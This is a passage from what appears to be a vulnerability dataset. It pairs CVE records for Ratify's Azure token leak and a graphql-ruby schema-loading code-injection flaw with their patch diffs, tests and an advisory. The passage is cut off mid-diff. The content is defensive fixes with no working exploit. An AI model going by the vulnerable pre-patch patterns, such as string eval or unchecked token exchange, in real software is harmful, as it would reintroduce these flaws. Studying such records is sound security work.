artifact\n \t\treturn provider.AuthConfig{}, err\n \t}\n \n+\tif err := validateHost(artifactHostName, d.endpoints); err != nil {\n+\t\treturn provider.AuthConfig{}, re.ErrorCodeHostNameInvalid.WithError(err)\n+\t}\n+\n \t// need to refresh AAD token if it's expired\n \tif time.Now().Add(time.Minute * 5).After(d.identityToken.ExpiresOn) {\n \t\tnewToken, err := getManagedIdentityToken(ctx, d.clientID)\n```\n\nFilename: pkg/common/oras/authprovider/azure/azureworkloadidentity.go:\n```\n@@ -33,14 +33,16 @@\nimport (\n \n type AzureWIProviderFactory struct{} //nolint:revive // ignore linter to have unique type name\n type azureWIAuthProvider struct {\n-\taadToken confidential.AuthResult\n-\ttenantID string\n-\tclientID string\n+\taadToken  confidential.AuthResult\n+\ttenantID  string\n+\tclientID  string\n+\tendpoints []string\n }\n \n type azureWIAuthProviderConf struct {\n-\tName     string `json:\"name\"`\n-\tClientID string `json:\"clientID,omitempty\"`\n+\tName      string   `json:\"name\"`\n+\tClientID  string   `json:\"clientID,omitempty\"`\n+\tEndpoints []string `json:\"endpoints,omitempty\"`\n }\n \n const (\n\n@@ -77,16 +79,22 @@\nfunc (s *AzureWIProviderFactory) Create(authProviderConfig provider.AuthProvider\n \t\t}\n \t}\n \n+\tendpoints, err := parseEndpoints(conf.Endpoints)\n+\tif err != nil {\n+\t\treturn nil, re.ErrorCodeConfigInvalid.WithError(err)\n+\t}\n+\n \t// retrieve an AAD Access token\n \ttoken, err := azureauth.GetAADAccessToken(context.Background(), tenant, clientID, AADResource)\n \tif err != nil {\n \t\treturn nil, re.ErrorCodeAuthDenied.NewError(re.AuthProvider, \"\", re.AzureWorkloadIdentityLink, err, \"\", re.HideStackTrace)\n \t}\n \n \treturn &azureWIAuthProvider{\n-\t\taadToken: token,\n-\t\ttenantID: tenant,\n-\t\tclientID: clientID,\n+\t\taadToken:  token,\n+\t\ttenantID:  tenant,\n+\t\tclientID:  clientID,\n+\t\tendpoints: endpoints,\n \t}, nil\n }\n\n@@ -116,6 +124,10 @@\nfunc (d *azureWIAuthProvider) Provide(ctx context.Context, artifact string) (pro\n \t\treturn provider.AuthConfig{}, re.ErrorCodeHostNameInvalid.WithComponentType(re.AuthProvider)\n \t}\n \n+\tif err := validateHost(artifactHostName, d.endpoints); err != nil {\n+\t\treturn provider.AuthConfig{}, re.ErrorCodeHostNameInvalid.WithError(err)\n+\t}\n+\n \t// need to refresh AAD token if it's expired\n \tif time.Now().Add(time.Minute * 5).After(d.aadToken.ExpiresOn) {\n \t\tnewToken, err := azureauth.GetAADAccessToken(ctx, d.tenantID, d.clientID, AADResource)\n```\n\nFilename: pkg/common/oras/authprovider/azure/const.go:\n```\n@@ -27,6 +27,9 @@\nconst (\n \tdefaultACRExpiryDuration     time.Duration = 3 * time.Hour\n )\n \n-var logOpt = logger.Option{\n-\tComponentType: logger.AuthProvider,\n-}\n+var (\n+\tlogOpt = logger.Option{\n+\t\tComponentType: logger.AuthProvider,\n+\t}\n+\tdefaultACREndpoints = []string{\"*.azurecr.io\", \"*.azurecr.us\", \"*.azurecr.cn\"}\n+)\n```\n\nFilename: pkg/common/oras/authprovider/azure/helper.go:\n```\n@@ -0,0 +1,72 @@\n+/*\n+Copyright The Ratify Authors.\n+Licensed under the Apache License, Version 2.0 (the \"License\");\n+you may not use this file except in compliance with the License.\n+You may obtain a copy of the License at\n+\n+http://www.apache.org/licenses/LICENSE-2.0\n+\n+Unless required by applicable law or agreed to in writing, software\n+distributed under the License is distributed on an \"AS IS\" BASIS,\n+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+See the License for the specific language governing permissions and\n+limitations under the License.\n+*/\n+\n+package azure\n+\n+import (\n+\t\"fmt\"\n+\t\"strings\"\n+)\n+\n+// parseEndpoints checks if the endpoints are valid for auth provider. If no\n+// endpoints are provided, it defaults to the default ACR endpoint.\n+// A valid endpoint is either a fully qualified domain name or a wildcard domain\n+// name folloiwing RFC 1034.\n+// Valid examples:\n+// - *.example.com\n+// - example.com\n+//\n+// Invalid examples:\n+// - *\n+// - example.*\n+// - *example.com.*\n+// - *.\n+func parseEndpoints(endpoints []string) ([]string, error) {\n+\tif len(endpoints) == 0 {\n+\t\treturn defaultACREndpoints, nil\n+\t}\n+\tfor _, endpoint := range endpoints {\n+\t\tswitch strings.Count(endpoint, \"*\") {\n+\t\tcase 0:\n+\t\t\tcontinue\n+\t\tcase 1:\n+\t\t\tif !strings.HasPrefix(endpoint, \"*.\") {\n+\t\t\t\treturn nil, fmt.Errorf(\"invalid wildcard domain name: %s, it must start with '*.'\", endpoint)\n+\t\t\t}\n+\t\t\tif len(endpoint) < 3 {\n+\t\t\t\treturn nil, fmt.Errorf(\"invalid wildcard domain name: %s, it must have at least one character after '*.'\", endpoint)\n+\t\t\t}\n+\t\tdefault:\n+\t\t\treturn nil, fmt.Errorf(\"invalid wildcard domain name: %s, it must have at most one wildcard character\", endpoint)\n+\t\t}\n+\t}\n+\treturn endpoints, nil\n+}\n+\n+// validateHost checks if the host is matching endpoints supported by the auth\n+// provider.\n+func validateHost(host string, endpoints []string) error {\n+\tfor _, endpoint := range endpoints {\n+\t\tif endpoint[0] == '*' {\n+\t\t\tif _, zone, ok := strings.Cut(host, \".\"); ok && zone == endpoint[2:] {\n+\t\t\t\treturn nil\n+\t\t\t}\n+\t\t}\n+\t\tif host == endpoint {\n+\t\t\treturn nil\n+\t\t}\n+\t}\n+\treturn fmt.Errorf(\"the artifact host %s is not in the scope of the store auth provider\", host)\n+}\n```\n\nFilename: pkg/common/oras/authprovider/azure/helper_test.go:\n```\n@@ -0,0 +1,110 @@\n+/*\n+Copyright The Ratify Authors.\n+Licensed under the Apache License, Version 2.0 (the \"License\");\n+you may not use this file except in compliance with the License.\n+You may obtain a copy of the License at\n+\n+http://www.apache.org/licenses/LICENSE-2.0\n+\n+Unless required by applicable law or agreed to in writing, software\n+distributed under the License is distributed on an \"AS IS\" BASIS,\n+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n+See the License for the specific language governing permissions and\n+limitations under the License.\n+*/\n+\n+package azure\n+\n+import (\n+\t\"testing\"\n+)\n+\n+func TestValidateEndpoints(t *testing.T) {\n+\ttests := []struct {\n+\t\tname        string\n+\t\tendpoint    string\n+\t\texpectedErr bool\n+\t}{\n+\t\t{\n+\t\t\tname:        \"global wildcard\",\n+\t\t\tendpoint:    \"*\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"multiple wildcard\",\n+\t\t\tendpoint:    \"*.example.*\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"no subdomain\",\n+\t\t\tendpoint:    \"*.\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"full qualified domain\",\n+\t\t\tendpoint:    \"example.com\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"valid wildcard domain\",\n+\t\t\tendpoint:    \"*.example.com\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t}\n+\n+\tfor _, tt := range tests {\n+\t\tt.Run(tt.name, func(t *testing.T) {\n+\t\t\t_, err := parseEndpoints([]string{tt.endpoint})\n+\t\t\tif tt.expectedErr != (err != nil) {\n+\t\t\t\tt.Fatalf(\"expected error: %v, got error: %v\", tt.expectedErr, err)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n+\n+func TestValidateHost(t *testing.T) {\n+\tendpoints := []string{\n+\t\t\"*.azurecr.io\",\n+\t\t\"example.azurecr.io\",\n+\t}\n+\ttests := []struct {\n+\t\tname        string\n+\t\thost        string\n+\t\texpectedErr bool\n+\t}{\n+\t\t{\n+\t\t\tname:        \"empty host\",\n+\t\t\thost:        \"\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"valid host\",\n+\t\t\thost:        \"example.azurecr.io\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"no subdomain\",\n+\t\t\thost:        \"azurecr.io\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"multiple subdomains\",\n+\t\t\thost:        \"example.test.azurecr.io\",\n+\t\t\texpectedErr: true,\n+\t\t},\n+\t\t{\n+\t\t\tname:        \"matched host\",\n+\t\t\thost:        \"test.azurecr.io\",\n+\t\t\texpectedErr: false,\n+\t\t},\n+\t}\n+\n+\tfor _, tt := range tests {\n+\t\tt.Run(tt.name, func(t *testing.T) {\n+\t\t\terr := validateHost(tt.host, endpoints)\n+\t\t\tif tt.expectedErr != (err != nil) {\n+\t\t\t\tt.Fatalf(\"expected error: %v, got error: %v\", tt.expectedErr, err)\n+\t\t\t}\n+\t\t})\n+\t}\n+}\n```\n\nFilename: pkg/controllers/logging.go:\n```\n@@ -122,7 +122,7 @@\nfunc (sink *LogrusSink) createEntry(keysAndValues ...interface{}) *logrus.Entry\n }\n \n func (sink *LogrusSink) formatMessage(msg string) string {\n-\tif sink.names == nil || len(sink.names) == 0 {\n+\tif len(sink.names) == 0 {\n \t\treturn msg\n \t}\n```\n\nFilename: pkg/keymanagementprovider/keymanagementprovider_test.go:\n```\n@@ -85,7 +85,7 @@\nfunc TestDecodeCertificates_ByteArrayToCertificates(t *testing.T) {\n \n \tr, err := DecodeCertificates(c1)\n \tif err != nil {\n-\t\tt.Fatalf(err.Error())\n+\t\tt.Fatal(err.Error())\n \t}\n \n \texpectedLen := 1\n```\n\nFilename: pkg/manager/manager.go:\n```\n@@ -105,7 +105,7 @@\nfunc StartServer(httpServerAddress, configFilePath, certDirectory, caCertFile st\n \t\tlogrus.Errorf(\"initialize server failed with error %v, exiting..\", err)\n \t\tos.Exit(1)\n \t}\n-\tlogrus.Infof(\"starting server at\" + httpServerAddress)\n+\tlogrus.Infof(\"starting server at %s\", httpServerAddress)\n \tif err := server.Run(certRotatorReady); err != nil {\n \t\tlogrus.Errorf(\"starting server failed with error %v, exiting..\", err)\n \t\tos.Exit(1)\n```\n\nFilename: pkg/verifier/notation/truststore_test.go:\n```\n@@ -133,7 +133,7 @@\nfunc TestGetCertificates_ErrorFromKMPReconcile(t *testing.T) {\n \t}\n \tstore, err := newTrustStore(nil, certStore)\n \tif err != nil {\n-\t\tt.Fatalf(\"failed to parse verificationCertStores: \" + err.Error())\n+\t\tt.Fatalf(\"failed to parse verificationCertStores: %s\", err.Error())\n \t}\n \n \tcontrollers.NamespacedCertStores = &mockCertStores{\n```\n\nFilename: pkg/verifier/result_test.go:\n```\n@@ -16,9 +16,10 @@\nlimitations under the License.\n package verifier\n \n import (\n-\t\"fmt\"\n \t\"testing\"\n \n+\te \"errors\"\n+\n \t\"github.com/ratify-project/ratify/errors\"\n )\n\n@@ -47,15 +48,15 @@\nfunc TestNewVerifierResult(t *testing.T) {\n \t\t{\n \t\t\tname:                \"error without detail\",\n \t\t\tmessage:             testMsg1,\n-\t\t\terr:                 errors.ErrorCodeUnknown.WithError(fmt.Errorf(testErrReason)).WithRemediation(testRemediation),\n+\t\t\terr:                 errors.ErrorCodeUnknown.WithError(e.New(testErrReason)).WithRemediation(testRemediation),\n \t\t\texpectedMsg:         testMsg1,\n \t\t\texpectedErrReason:   testErrReason,\n \t\t\texpectedRemediation: testRemediation,\n \t\t},\n \t\t{\n \t\t\tname:                \"error with detail\",\n \t\t\tmessage:             testMsg1,\n-\t\t\terr:                 errors.ErrorCodeUnknown.WithError(fmt.Errorf(testErrReason)).WithRemediation(testRemediation).WithDetail(testMsg2),\n+\t\t\terr:                 errors.ErrorCodeUnknown.WithError(e.New(testErrReason)).WithRemediation(testRemediation).WithDetail(testMsg2),\n \t\t\texpectedMsg:         testMsg2,\n \t\t\texpectedErrReason:   testErrReason,\n \t\t\texpectedRemediation: testRemediation,\n```\n\nFilename: pkg/verifier/types/types_test.go:\n```\n@@ -16,9 +16,10 @@\nlimitations under the License.\n package types\n \n import (\n-\t\"fmt\"\n \t\"testing\"\n \n+\te \"errors\"\n+\n \t\"github.com/ratify-project/ratify/errors\"\n )\n\n@@ -47,15 +48,15 @@\nfunc TestCreateVerifierResult(t *testing.T) {\n \t\t{\n \t\t\tname:                \"error without detail\",\n \t\t\tmessage:             testMsg1,\n-\t\t\terr:                 errors.ErrorCodeUnknown.WithError(fmt.Errorf(testErrReason)).WithRemediation(testRemediation),\n+\t\t\terr:                 errors.ErrorCodeUnknown.WithError(e.New(testErrReason)).WithRemediation(testRemediation),\n \t\t\texpectedMsg:         testMsg1,\n \t\t\texpectedErrReason:   testErrReason,\n \t\t\texpectedRemediation: testRemediation,\n \t\t},\n \t\t{\n \t\t\tname:                \"error with detail\",\n \t\t\tmessage:             testMsg1,\n-\t\t\terr:                 errors.ErrorCodeUnknown.WithError(fmt.Errorf(testErrReason)).WithRemediation(testRemediation).WithDetail(testMsg2),\n+\t\t\terr:                 errors.ErrorCodeUnknown.WithError(e.New(testErrReason)).WithRemediation(testRemediation).WithDetail(testMsg2),\n \t\t\texpectedMsg:         testMsg2,\n \t\t\texpectedErrReason:   testErrReason,\n \t\t\texpectedRemediation: testRemediation,\n```\n\nFilename: scripts/azure-ci-test.sh:\n```\n@@ -27,7 +27,7 @@\nexport AKS_NAME=\"${AKS_NAME:-ratify-aks-${SUFFIX}}\"\n export KEYVAULT_NAME=\"${KEYVAULT_NAME:-ratify-akv-${SUFFIX}}\"\n export USER_ASSIGNED_IDENTITY_NAME=\"${USER_ASSIGNED_IDENTITY_NAME:-ratify-e2e-identity-${SUFFIX}}\"\n export LOCATION=\"westus2\"\n-export KUBERNETES_VERSION=${1:-1.29.2}\n+export KUBERNETES_VERSION=${1:-1.30.6}\n GATEKEEPER_VERSION=${2:-3.17.0}\n TENANT_ID=$3\n export RATIFY_NAMESPACE=${4:-gatekeeper-system}\n```\n\nFilename: terraform/azure/main.tf:\n```\n@@ -107,7 +107,7 @@\nresource \"azurerm_kubernetes_cluster\" \"aks\" {\n   location                  = azurerm_resource_group.rg.location\n   resource_group_name       = azurerm_resource_group.rg.name\n   dns_prefix                = \"${var.cluster_name}-dns\"\n-  kubernetes_version        = \"1.29.2\"\n+  kubernetes_version        = \"1.30.6\"\n   workload_identity_enabled = true\n   oidc_issuer_enabled       = true\n```",
                "url": "https://github.com/ratify-project/ratify/commit/84c7c48fa76bb9a1c9583635d1e90bc25b1a546c"
            }
        ],
        "published_date": "2025-03-11T14:16:10.013Z",
        "sec_adv": [
            {
                "content": "Skip to content\nNavigation Menu\nProduct\nSolutions\nResources\nOpen Source\nEnterprise\nPricing\nSearch or jump to...\nSign in\nSign up\nAppearance settings\nDismiss alert\nratify-project\n/\nratify\nPublic\nNotifications You must be signed in to change notification settings\nFork 69\nStar 262\nCode\nIssues\n114\nPull requests\n3\nDiscussions\nActions\nProjects\n1\nSecurity\n1\nInsights\nAdditional navigation options\nRatify Azure authentication providers can leak authentication tokens to non-Azure container registries\nHigh akashsinghal published GHSA-44f7-5fj5-h4px on Mar 10Mar 10, 2025\nPackage\ngomod github.com/ratify-project/ratify\n(\nGo\n)\nAffected versions\n<= 1.2.2, 1.3.0, 1.3.1\nPatched versions\n1.2.3, 1.3.2\nDescription\nImpact\nIn a Kubernetes environment, Ratify can be configured to authenticate to a private Azure Container Registry (ACR). The Azure workload identity and Azure managed identity authentication providers are configured in this setup. Users that configure a private ACR to be used with the Azure authentication providers may be impacted.\nBoth Azure authentication providers attempt to exchange an Entra ID (EID) token for an ACR refresh token. However, Ratify\u2019s Azure authentication providers did not verify that the target registry is an ACR. This could have led to the EID token being presented to a non-ACR registry during token exchange. EID tokens with ACR access can potentially be extracted and abused if a user workload contains an image reference to a malicious registry.\nPatches\nThe Azure workload identity and Azure managed identity authentication providers are updated to add new validation prior to EID token exchange. Validation relies upon registry domain validation against a pre-configured list of well-known ACR endpoints. EID token exchange will be executed only if at least one of the configured well-known domain suffixes (wildcard support included) matches the registry domain of the image reference.\nCredits\nThe ratify project would like to thank Shiwei Zhang (@shizhMSFT) and Binbin Li (@binbin-li) for responsibly disclosing the issue and thank Binbin Li (@binbin-li) and Akash Singhal (@akashsinghal) for actively mitigating the issue.\nSeverity\nHigh\n7.2\n/ 10\nCVSS v4 base metrics\nExploitability Metrics\nAttack Vector\nNetwork\nAttack Complexity\nLow\nAttack Requirements\nPresent\nPrivileges Required\nNone\nUser interaction\nPassive\nVulnerable System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nSubsequent System Impact Metrics\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nLearn more about base metrics\nCVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:H/SI:H/SA:L\nCVE ID\nCVE-2025-27403\nWeaknesses\nNo CWEs\nFooter\n\u00a9 2025 GitHub, Inc.\nFooter navigation\nTerms\nPrivacy\nSecurity\nStatus\nDocs\nContact\nManage cookies\nDo not share my personal information",
                "effective": false,
                "effective_reason": "The advisory does not include either proof of concept code or detailed steps to reproduce the issue; it only describes the impact and the fix.",
                "url": "https://github.com/ratify-project/ratify/security/advisories/GHSA-44f7-5fj5-h4px"
            }
        ],
        "sw_version": "v1.2.2",
        "sw_version_wget": "https://github.com/ratify-project/ratify/archive/refs/tags/v1.2.2.zip"
    },
    "CVE-2025-27407": {
        "cwe": [
            {
                "id": "CWE-94",
                "value": "CWE-94: Improper Control of Generation of Code ('Code Injection')"
            }
        ],
        "description": "graphql-ruby is a Ruby implementation of GraphQL. Starting in version 1.11.5 and prior to versions 1.11.8, 1.12.25, 1.13.24, 2.0.32, 2.1.14, 2.2.17, and 2.3.21, loading a malicious schema definition in `GraphQL::Schema.from_introspection` (or `GraphQL::Schema::Loader.load`) can result in remote code execution. Any system which loads a schema by JSON from an untrusted source is vulnerable, including those that use GraphQL::Client to load external schemas via GraphQL introspection. Versions 1.11.8, 1.12.25, 1.13.24, 2.0.32, 2.1.14, 2.2.17, and 2.3.21 contain a patch for the issue.",
        "languages": [
            "Ruby"
        ],
        "patch_commits": [
            {
                "content": "Merge commit from fork\n\n[1.12] fix CVE 2025 27407\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accepts strings and may result evaluating unexpected code. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -133,6 +133,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -276,6 +278,7 @@\ndef initialize_node #{arguments.join(\", \")}\n               RUBY\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -55,6 +55,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required:, type: nil, name: nil, loads: nil, description: nil, ast_node: nil, default_value: NO_DEFAULT, as: nil, from_resolver: false, camelize: true, prepare: nil, method_access: true, owner:, validates: nil, directives: nil, deprecation_reason: nil, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @null = !required\n\n@@ -78,11 +79,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required:, type: nil\n         self.validates(validates)\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -426,17 +426,18 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval <<-RUBY, __FILE__, __LINE__\n-                # frozen_string_literal: true\n-                def #{resolve_method_name}(**args)\n-                  field_instance = self.class.get_field(\"#{field_definition.name}\")\n-                  context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n-                end\n-              RUBY\n+              define_field_resolve_method(owner, resolve_method_name, field_definition.name)\n             end\n           end\n         end\n \n+        def define_field_resolve_method(owner, method_name, field_name)\n+          owner.define_method(method_name) { |**args|\n+            field_instance = self.class.get_field(field_name)\n+            context.schema.definition_default_resolve.call(self.class, field_instance, object, args, context)\n+          }\n+        end\n+\n         def build_resolve_type(lookup_hash, directives, missing_type_handler)\n           resolve_type_proc = nil\n           resolve_type_proc = ->(ast_node) {\n```\n\nFilename: lib/graphql/schema/enum_value.rb:\n```\n@@ -55,7 +55,7 @@\ndef initialize(graphql_name, desc = nil, owner:, ast_node: nil, directives: nil,\n         end\n \n         if block_given?\n-          instance_eval(&block)\n+          instance_exec(self, &block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/field.rb:\n```\n@@ -231,6 +231,7 @@\ndef initialize(type: nil, name: nil, owner: nil, null: nil, field: nil, function\n         name_s = -name.to_s\n         @underscored_name = -Member::BuildType.underscore(name_s)\n         @name = -(camelize ? Member::BuildType.camelize(name_s) : name_s)\n+        NameValidator.validate!(@name)\n         @description = description\n         if field.is_a?(GraphQL::Schema::Field)\n           raise ArgumentError, \"Instead of passing a field as `field:`, use `add_field(field)` to add an already-defined field.\"\n```\n\nFilename: lib/graphql/schema/input_object.rb:\n```\n@@ -123,12 +123,8 @@\nclass << self\n         def argument(*args, **kwargs, &block)\n           argument_defn = super(*args, **kwargs, &block)\n           # Add a method access\n-          method_name = argument_defn.keyword\n-          class_eval <<-RUBY, __FILE__, __LINE__\n-            def #{method_name}\n-              self[#{method_name.inspect}]\n-            end\n-          RUBY\n+          define_accessor_method(argument_defn.keyword)\n+          argument_defn\n         end\n \n         def to_graphql\n\n@@ -236,6 +232,13 @@\ndef coerce_result(value, ctx)\n \n           result\n         end\n+\n+        private\n+\n+        def define_accessor_method(method_name)\n+          define_method(method_name) { self[method_name] }\n+          alias_method(method_name, method_name)\n+        end\n       end\n \n       private\n```\n\nFilename: lib/graphql/version.rb:\n```\n@@ -1,4 +1,4 @@\n# frozen_string_literal: true\n module GraphQL\n-  VERSION = \"1.12.24\"\n+  VERSION = \"1.12.25\"\n end\n```\n\nFilename: spec/graphql/schema/loader_spec.rb:\n```\n@@ -389,4 +389,153 @@\ndef assert_deep_equal(expected_type, actual_type)\n       assert_equal arg.default_value, { 'id' => nil, 'int' => nil, 'float' => nil, 'enum' => nil, 'sub' => nil, 'bool' => nil, 'bigint' => nil }\n     end\n   end\n+\n+  it \"validates field argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"something-wrong\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"SCALAR\",\n+                        \"name\" => \"Int\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"something-wrong\"\n+  end\n+\n+  it \"validates field names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"bad.int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [],\n+                }\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad.int\"\n+  end\n+\n+  it \"validates input object argument names\" do\n+    json = {\n+      \"data\" => {\n+        \"__schema\" => {\n+          \"queryType\" => {\n+            \"name\" => \"Query\"\n+          },\n+          \"mutationType\" => nil,\n+          \"subscriptionType\" => nil,\n+          \"types\" => [\n+            {\n+              \"kind\" => \"OBJECT\",\n+              \"name\" => \"Query\",\n+              \"description\" => nil,\n+              \"fields\" => [\n+                {\n+                  \"name\" => \"int\",\n+                  \"description\" => nil,\n+                  \"type\" => {\n+                    \"kind\" => \"SCALAR\",\n+                    \"name\" => \"Int\",\n+                    \"ofType\" => nil,\n+                  },\n+                  \"args\" => [\n+                    {\n+                      \"name\" => \"inputObject\",\n+                      \"description\" => nil,\n+                      \"type\" => {\n+                        \"kind\" => \"INPUT_OBJECT\",\n+                        \"name\" => \"SomeInputObject\",\n+                        \"ofType\" => nil\n+                      },\n+                      \"defaultValue\" => nil\n+                    }\n+                  ],\n+                }\n+              ]\n+            },\n+            {\n+              \"kind\" => \"INPUT_OBJECT\",\n+              \"name\" => \"SomeInputObject\",\n+              \"description\" => nil,\n+              \"inputFields\" => [\n+                {\n+                  \"name\"=>\"bad, input\",\n+                  \"type\"=> { \"kind\" => \"SCALAR\", \"name\" => \"String\"},\n+                  \"defaultValue\"=> nil,\n+                  \"description\" => nil,\n+                },\n+              ]\n+            }\n+          ]\n+        }\n+      }\n+    }\n+    err = assert_raises GraphQL::InvalidNameError do\n+      GraphQL::Schema.from_introspection(json)\n+    end\n+\n+    assert_includes err.message, \"bad, input\"\n+  end\n end\n```",
                "url": "https://github.com/rmosolgo/graphql-ruby/commit/28233b16c0eb9d0fb7808f4980e061dc7507c4cd"
            },
            {
                "content": "Merge commit from fork\n\n[1.11] fix CVE 2025 27407\n\nFilename: cop/development/no_eval_cop.rb:\n```\n@@ -0,0 +1,18 @@\n+# frozen_string_literal: true\n+require 'rubocop'\n+\n+module Cop\n+  module Development\n+    class NoEvalCop < RuboCop::Cop::Base\n+      MSG_TEMPLATE = \"Don't use `%{eval_method_name}` which accept strings and may result in unexpected code being generated. Use `%{exec_method_name}` instead, and pass a block.\"\n+\n+      def on_send(node)\n+        case node.method_name\n+        when :module_eval, :class_eval, :instance_eval\n+          message = MSG_TEMPLATE % { eval_method_name: node.method_name, exec_method_name: node.method_name.to_s.sub(\"eval\", \"exec\").to_sym }\n+          add_offense node, message: message\n+        end\n+      end\n+    end\n+  end\n+end\n```\n\nFilename: lib/graphql/language/nodes.rb:\n```\n@@ -133,6 +133,8 @@\ndef merge!(new_options)\n         end\n \n         class << self\n+          # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n+\n           # Add a default `#visit_method` and `#children_method_name` using the class name\n           def inherited(child_class)\n             super\n\n@@ -265,8 +267,11 @@\ndef initialize_node #{arguments.join(\", \")}\n                   #{assignments.join(\"\\n\")}\n                 end\n               RUBY\n+\n+              # rubocop:enable Development/NoEvalCop\n             end\n           end\n+          # rubocop:enable Development/NoEvalCop\n         end\n       end\n```\n\nFilename: lib/graphql/language/visitor.rb:\n```\n@@ -73,6 +73,7 @@\ndef visit\n           @document\n         end\n       end\n+      # rubocop:disable Development/NoEvalCop This eval takes static inputs at load-time\n \n       # Call the user-defined handler for `node`.\n       def visit_node(node, parent)\n```\n\nFilename: lib/graphql/schema/argument.rb:\n```\n@@ -49,6 +49,7 @@\ndef from_resolver?\n       def initialize(arg_name = nil, type_expr = nil, desc = nil, required:, type: nil, name: nil, loads: nil, description: nil, ast_node: nil, default_value: NO_DEFAULT, as: nil, from_resolver: false, camelize: true, prepare: nil, method_access: true, owner:, deprecation_reason: nil, &definition_block)\n         arg_name ||= name\n         @name = -(camelize ? Member::BuildType.camelize(arg_name.to_s) : arg_name.to_s)\n+        NameValidator.validate!(@name)\n         @type_expr = type_expr || type\n         @description = desc || description\n         @null = !required\n\n@@ -64,11 +65,8 @@\ndef initialize(arg_name = nil, type_expr = nil, desc = nil, required:, type: nil\n         self.deprecation_reason = deprecation_reason\n \n         if definition_block\n-          if definition_block.arity == 1\n-            instance_exec(self, &definition_block)\n-          else\n-            instance_eval(&definition_block)\n-          end\n+          # `self` will still be self, it will also be the first argument to the block:\n+          instance_exec(self, &definition_block)\n         end\n       end\n```\n\nFilename: lib/graphql/schema/build_from_definition.rb:\n```\n@@ -342,13 +342,7 @@\ndef build_fields(owner, field_definitions, type_resolver, default_resolve:)\n \n             # Don't do this for interfaces\n             if default_resolve\n-              owner.class_eval 